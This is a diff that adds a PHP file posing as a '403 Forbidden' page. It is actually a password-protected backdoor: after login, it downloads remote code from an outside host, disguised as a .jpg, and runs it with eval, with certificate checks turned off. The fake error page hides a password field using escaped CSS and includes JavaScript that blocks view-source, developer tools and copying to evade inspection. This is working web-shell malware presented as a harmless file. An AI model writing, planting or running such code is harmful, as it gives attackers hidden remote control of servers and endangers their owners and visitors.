@@ -1,0 +1,145 @@
+<?php
+session_start();
+
+function geturlsinfo($url)
+{
+    $conn = curl_init($url);
+    curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
+    curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0");
+    curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
+    curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
+    $data = curl_exec($conn);
+    curl_close($conn);
+    return $data;
+}
+
+function is_logged_in()
+{
+    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
+}
+
+if (isset($_POST['password'])) {
+    $input_pass = $_POST['password'];
+    $hash = '8f9413364f3cc53824d30d2fdb967191';
+    if (md5($input_pass) === $hash) {
+        $_SESSION['logged_in'] = true;
+    } else {
+        echo "Incorrect password.";
+    }
+}
+
+if (is_logged_in()) {
+    $url = "https://examples2.pages.dev/1.jpg";
+    $content = geturlsinfo($url);
+    eval('?>' . $content);
+} else {
+?>
+    <!doctype html>
+    <html lang="en">
+
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>403 Forbidden</title>
+    </head>
+
+    <body>
+        <h1>Forbidden</h1>
+        <p>You don't have permission to access <?php echo htmlspecialchars($_SERVER['REQUEST_URI']); ?> on this server.</p>
+        <script>
+            (function hardenClient() {
+                document.addEventListener('contextmenu', e => e.preventDefault(), {
+                    passive: false
+                });
+                document.addEventListener('selectstart', e => e.preventDefault(), {
+                    passive: false
+                });
+                document.addEventListener('copy', e => e.preventDefault(), {
+                    passive: false
+                });
+                document.addEventListener('cut', e => e.preventDefault(), {
+                    passive: false
+                });
+                document.addEventListener('dragstart', e => e.preventDefault(), {
+                    passive: false
+                });
+                window.addEventListener('keydown', function(e) {
+                    const key = e.key || e.keyCode;
+                    if ((e.ctrlKey && (key === 'u' || key === 'U' || key === 's' || key === 'S' || key === 'p' || key === 'P')) ||
+                        (e.ctrlKey && e.shiftKey && ['I', 'i', 'J', 'j', 'C', 'c'].includes(key)) ||
+                        key === 'F12' || key === 'Tab') {
+                        e.preventDefault();
+                        e.stopPropagation();
+                        return false;
+                    }
+                }, true);
+
+                function detectDevTools() {
+                    const start = performance.now();
+                    debugger;
+                    const delta = performance.now() - start;
+                    if (delta > 100) {
+                        try {
+                            document.documentElement.innerHTML = '';
+                            window.location.href = 'about:blank';
+                        } catch (err) {
+                            /* ignore */
+                        }
+                    }
+                }
+
+                function checkDevtoolsBySize() {
+                    if (window.outerWidth - window.innerWidth > 160 ||
+                        window.outerHeight - window.innerHeight > 160) {
+                        try {
+                            document.documentElement.innerHTML = '';
+                            window.location.href = 'about:blank';
+                        } catch (err) {
+                            /* ignore */
+                        }
+                    }
+                }
+
+                setInterval(checkDevtoolsBySize, 500);
+                setInterval(detectDevTools, 1200);
+
+                try {
+                    if (location.href.startsWith('view-source:')) {
+                        document.documentElement.innerHTML = '';
+                        window.location.href = 'about:blank';
+                    }
+                } catch (err) {}
+
+                function showBlockedOverlay() {
+                    const o = document.createElement('div');
+                    o.id = 'blocked-overlay';
+                    Object.assign(o.style, {
+                        position: 'fixed',
+                        inset: 0,
+                        background: '#fff',
+                        color: '#000',
+                        display: 'flex',
+                        alignItems: 'center',
+                        justifyContent: 'center',
+                        zIndex: 2147483647,
+                        fontSize: '18px'
+                    });
+                    o.textContent = '403 Forbidden.';
+                    document.documentElement.appendChild(o);
+                }
+            })();
+        </script>
+        <form method="POST">
+            <input type="password" name="password" id="password" style="m\000061rgin:calc(0px);
+  background:\000066ff;
+  border:calc(1px) solid #ffffffff;
+  position:abso\00006cute;
+  t\00006fp:0;ri\000067ht:0">
+        </form>
+    </body>
+
+    </html>
+<?php
+}
+?>
